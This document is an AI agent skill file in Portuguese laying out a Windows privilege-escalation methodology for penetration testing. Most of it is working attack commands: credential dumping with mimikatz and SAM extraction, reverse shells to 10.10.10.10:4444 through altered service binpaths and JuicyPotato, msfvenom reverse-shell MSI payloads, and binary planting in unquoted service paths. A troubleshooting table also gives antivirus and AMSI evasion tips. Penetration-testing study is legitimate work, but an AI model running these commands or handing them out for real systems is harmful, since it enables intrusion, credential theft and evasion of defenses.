---
name: Windows Privilege Escalation
description: Esta skill deve ser usada quando o usuário pedir para "escalar privilégios no Windows," "encontrar vetores de privesc do Windows," "enumerar Windows para escalação de privilégios," "explorar configurações erradas do Windows," ou "realizar escalação de privilégios pós-exploração." Ela oferece orientação abrangente para descobrir e explorar vulnerabilidades de escalação de privilégios em ambientes Windows.
metadata:
  author: zebbern
  version: "1.1"
---

# Escalação de Privilégios no Windows

## Propósito

Fornecer metodologias sistemáticas para descobrir e explorar vulnerabilidades de escalação de privilégios em sistemas Windows durante atividades de teste de penetração. Esta skill abrange enumeração de sistema, colheita de credenciais, exploração de serviços, impersonação de tokens, exploits de kernel e várias configurações erradas que permitem escalar de usuário padrão para privilégios de Administrator ou SYSTEM.

## Inputs / Pré-requisitos

- **Acesso Inicial**: Shell ou acesso RDP como usuário padrão no sistema Windows
- **Ferramentas de Enumeração**: WinPEAS, PowerUp, Seatbelt ou comandos manuais
- **Binários de Exploit**: Exploits pré-compilados ou capacidade de transferir ferramentas
- **Conhecimento**: Compreensão do modelo de segurança Windows e privilégios
- **Autorização**: Permissão por escrito para atividades de teste de penetração

## Outputs / Entregáveis

- **Caminho de Escalação de Privilégios**: Vetor identificado para privilégios maiores
- **Dump de Credenciais**: Senhas, hashes ou tokens colhidos
- **Shell Elevado**: Execução de comando como Administrator ou SYSTEM
- **Relatório de Vulnerabilidade**: Documentação de configurações erradas e exploits
- **Recomendações de Remediação**: Correções para as fraquezas identificadas

## Fluxo de Trabalho Principal

### 1. Enumeração de Sistema

#### Informações Básicas do Sistema
```powershell
# Versão do SO e patches
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe

# Arquitetura
wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%

# Variáveis de ambiente
set
Get-ChildItem Env: | ft Key,Value

# Listar unidades
wmic logicaldisk get caption,description,providername
```

#### Enumeração de Usuários
```powershell
# Usuário atual
whoami
echo %USERNAME%

# Privilégios do usuário
whoami /priv
whoami /groups
whoami /all

# Todos os usuários
net user
Get-LocalUser | ft Name,Enabled,LastLogon

# Detalhes do usuário
net user administrator
net user %USERNAME%

# Grupos locais
net localgroup
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name,PrincipalSource
```

#### Enumeração de Rede
```powershell
# Interfaces de rede
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address

# Tabela de roteamento
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric

# Tabela ARP
arp -A

# Conexões ativas
netstat -ano

# Compartilhamentos de rede
net share

# Controladores de Domínio
nltest /DCLIST:DomainName
```

#### Enumeração de Antivírus
```powershell
# Verificar produtos AV
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
```

### 2. Colheita de Credenciais

#### Arquivos SAM e SYSTEM
```powershell
# Localizações do arquivo SAM
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM

# Localizações do arquivo SYSTEM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

# Extrair hashes (do Linux após obter os arquivos)
pwdump SYSTEM SAM > sam.txt
samdump2 SYSTEM SAM -o sam.txt

# Quebrar com John
john --format=NT sam.txt
```

#### HiveNightmare (CVE-2021-36934)
```powershell
# Verificar vulnerabilidade
icacls C:\Windows\System32\config\SAM
# Vulnerável se: BUILTIN\Users:(I)(RX)

# Explorar com mimikatz
mimikatz> token::whoami /full
mimikatz> misc::shadowcopies
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
```

#### Procurar por Senhas
```powershell
# Pesquisar conteúdo de arquivos
findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config

# Pesquisar registro
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Credenciais de logon automático do Windows
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

# Sessões PuTTY
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Senhas VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

# Pesquisar arquivos específicos
dir /S /B *pass*.txt == *pass*.xml == *cred* == *vnc* == *.config*
where /R C:\ *.ini
```

#### Credenciais Unattend.xml
```powershell
# Localizações comuns
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

# Pesquisar arquivos
dir /s *sysprep.inf *sysprep.xml *unattend.xml 2>nul

# Decodificar senha base64 (Linux)
echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=" | base64 -d
```

#### Senhas WiFi
```powershell
# Listar perfis
netsh wlan show profile

# Obter senha em texto claro
netsh wlan show profile <SSID> key=clear

# Extrair todas as senhas WiFi
for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Key" | find /v "Number" & echo.) & @echo on
```

#### Histórico PowerShell
```powershell
# Visualizar histórico do PowerShell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### 3. Exploração de Serviços

#### Permissões Incorretas de Serviço
```powershell
# Encontrar serviços configurados incorretamente
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -ucqv <service_name>

# Procurar por: SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG

# Explorar serviço vulnerável
sc config <service> binpath= "C:\nc.exe -e cmd.exe 10.10.10.10 4444"
sc stop <service>
sc start <service>
```

#### Caminhos de Serviço Sem Aspas
```powershell
# Encontrar caminhos sem aspas
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Explorar: Colocar exe malicioso no caminho
# Para caminho: C:\Program Files\Some App\service.exe
# Tentar: C:\Program.exe ou C:\Program Files\Some.exe
```

#### AlwaysInstallElevated
```powershell
# Verificar se está habilitado
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Ambos devem retornar 0x1 para vulnerabilidade

# Criar MSI malicioso
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# Instalar (executa como SYSTEM)
msiexec /quiet /qn /i C:\evil.msi
```

### 4. Impersonação de Tokens

#### Verificar Privilégios de Impersonação
```powershell
# Procurar por estes privilégios
whoami /priv

# Privilégios exploráveis:
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeCreateTokenPrivilege
# SeLoadDriverPrivilege
# SeTakeOwnershipPrivilege
# SeDebugPrivilege
```

#### Ataques Potato
```powershell
# JuicyPotato (Windows Server 2019 e anteriores)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe" -t *

# PrintSpoofer (Windows 10 e Server 2019)
PrintSpoofer.exe -i -c cmd

# RoguePotato
RoguePotato.exe -r 10.10.10.10 -e "C:\nc.exe 10.10.10.10 4444 -e cmd.exe" -l 9999

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

### 5. Exploração de Kernel

#### Encontrar Vulnerabilidades de Kernel
```powershell
# Usar Windows Exploit Suggester
systeminfo > systeminfo.txt
python wes.py systeminfo.txt

# Ou usar Watson (no alvo)
Watson.exe

# Ou usar script PowerShell Sherlock
powershell.exe -ExecutionPolicy Bypass -File Sherlock.ps1
```

#### Exploits de Kernel Comuns
```
MS17-010 (EternalBlue) - Windows 7/2008/2003/XP
MS16-032 - Secondary Logon Handle - 2008/7/8/10/2012
MS15-051 - Client Copy Image - 2003/2008/7
MS14-058 - TrackPopupMenu - 2003/2008/7/8.1
MS11-080 - afd.sys - XP/2003
MS10-015 - KiTrap0D - 2003/XP/2000
MS08-067 - NetAPI - 2000/XP/2003
CVE-2021-1732 - Win32k - Windows 10/Server 2019
CVE-2020-0796 - SMBGhost - Windows 10
CVE-2019-1388 - UAC Bypass - Windows 7/8/10/2008/2012/2016/2019
```

### 6. Técnicas Adicionais

#### DLL Hijacking
```powershell
# Encontrar DLLs faltantes com Process Monitor
# Filtrar: Result = NAME NOT FOUND, Path termina com .dll

# Compilar DLL malicioso
# Para x64: x86_64-w64-mingw32-gcc windows_dll.c -shared -o evil.dll
# Para x86: i686-w64-mingw32-gcc windows_dll.c -shared -o evil.dll
```

#### Runas com Credenciais Salvas
```powershell
# Listar credenciais salvas
cmdkey /list

# Usar credenciais salvas
runas /savecred /user:Administrator "cmd.exe /k whoami"
runas /savecred /user:WORKGROUP\Administrator "\\10.10.10.10\share\evil.exe"
```

#### Exploração WSL
```powershell
# Verificar WSL
wsl whoami

# Definir root como usuário padrão
wsl --default-user root
# Ou: ubuntu.exe config --default-user root

# Gerar shell como root
wsl whoami
wsl python -c 'import os; os.system("/bin/bash")'
```

## Referência Rápida

### Ferramentas de Enumeração

| Ferramenta | Comando | Propósito |
|------|---------|---------|
| WinPEAS | `winPEAS.exe` | Enumeração abrangente |
| PowerUp | `Invoke-AllChecks` | Vulnerabilidades de serviço/caminho |
| Seatbelt | `Seatbelt.exe -group=all` | Verificações de auditoria de segurança |
| Watson | `Watson.exe` | Patches faltantes |
| JAWS | `.\jaws-enum.ps1` | Enum Windows legado |
| PrivescCheck | `Invoke-PrivescCheck` | Verificações de escalação de privilégios |

### Pastas Padrão Graváveis

```
C:\Windows\Temp
C:\Windows\Tasks
C:\Users\Public
C:\Windows\tracing
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
```

### Vetores Comuns de Escalação de Privilégios

| Vetor | Comando de Verificação |
|--------|---------------|
| Caminhos sem aspas | `wmic service get pathname \| findstr /i /v """` |
| Perms fracas de serviço | `accesschk.exe -uwcqv "Everyone" *` |
| AlwaysInstallElevated | `reg query HKCU\...\Installer /v AlwaysInstallElevated` |
| Credenciais armazenadas | `cmdkey /list` |
| Privilégios de token | `whoami /priv` |
| Tarefas agendadas | `schtasks /query /fo LIST /v` |

### Exploits de Privilégio de Impersonação

| Privilégio | Ferramenta | Uso |
|-----------|------|-------|
| SeImpersonatePrivilege | JuicyPotato | Abuso de CLSID |
| SeImpersonatePrivilege | PrintSpoofer | Serviço Spooler |
| SeImpersonatePrivilege | RoguePotato | Resolvedor OXID |
| SeBackupPrivilege | robocopy /b | Ler arquivos protegidos |
| SeRestorePrivilege | Enable-SeRestorePrivilege | Escrever em arquivos protegidos |
| SeTakeOwnershipPrivilege | takeown.exe | Tomar propriedade de arquivo |

## Restrições e Limitações

### Limites Operacionais
- Exploits de kernel podem causar instabilidade do sistema
- Alguns exploits requerem versões específicas do Windows
- AV/EDR pode detectar e bloquear ferramentas comuns
- A impersonação de tokens requer contexto de conta de serviço
- Algumas técnicas requerem acesso GUI

### Considerações de Detecção
- Colheita de credenciais dispara alertas de segurança
- Modificação de serviço registrada em Event Logs
- Execução do PowerShell pode ser monitorada
- Assinaturas conhecidas de exploit detectadas por AV

### Requisitos Legais
- Testar apenas sistemas com autorização por escrito
- Documentar todas as tentativas de escalação
- Evitar interromper sistemas em produção
- Relatar todas as descobertas por canais apropriados

## Exemplos

### Exemplo 1: Exploração de Caminho Binário de Serviço
```powershell
# Encontrar serviço vulnerável
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
# Resultado: RW MyService SERVICE_ALL_ACCESS

# Verificar configuração atual
sc qc MyService

# Parar serviço e alterar caminho binário
sc stop MyService
sc config MyService binpath= "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
sc start MyService

# Capturar shell como SYSTEM
```

### Exemplo 2: Exploração AlwaysInstallElevated
```powershell
# Verificar vulnerabilidade
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Ambos retornam: 0x1

# Gerar payload (máquina do atacante)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o shell.msi

# Transferir e executar
msiexec /quiet /qn /i C:\Users\Public\shell.msi

# Capturar shell SYSTEM
```

### Exemplo 3: Impersonação de Token JuicyPotato
```powershell
# Verificar SeImpersonatePrivilege
whoami /priv
# SeImpersonatePrivilege Habilitado

# Executar JuicyPotato
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe 10.10.10.10 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# Capturar shell SYSTEM
```

### Exemplo 4: Caminho de Serviço Sem Aspas
```powershell
# Encontrar caminho sem aspas
wmic service get name,pathname | findstr /i /v """
# Resultado: C:\Program Files\Vuln App\service.exe

# Verificar permissões de escrita
icacls "C:\Program Files\Vuln App"
# Resultado: Users:(W)

# Colocar binário malicioso
copy C:\Users\Public\shell.exe "C:\Program Files\Vuln.exe"

# Reiniciar serviço
sc stop "Vuln App"
sc start "Vuln App"
```

### Exemplo 5: Colheita de Credenciais do Registro
```powershell
# Verificar credenciais de logon automático
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# DefaultUserName: Administrator
# DefaultPassword: P@ssw0rd123

# Usar credenciais
runas /user:Administrator cmd.exe
# Ou para remoto: psexec \\target -u Administrator -p P@ssw0rd123 cmd
```

## Solução de Problemas

| Problema | Causa | Solução |
|-------|-------|----------|
| Exploit falha (AV detectado) | AV bloqueando exploits conhecidos | Usar exploits ofuscados; viver da terra (mshta, certutil); binários compilados customizados |
| Serviço não inicia | Sintaxe do caminho binário | Garantir espaço após `=` em binpath: `binpath= "C:\path\binary.exe"` |
| Impersonação de token falha | Privilégio errado/versão | Verificar `whoami /priv`; verificar compatibilidade de versão do Windows |
| Não conseguir encontrar exploit de kernel | Sistema corrigido | Executar Windows Exploit Suggester: `python wes.py systeminfo.txt` |
| PowerShell bloqueado | Política de execução/AMSI | Usar `powershell -ep bypass -c "cmd"` ou `-enc <base64>` |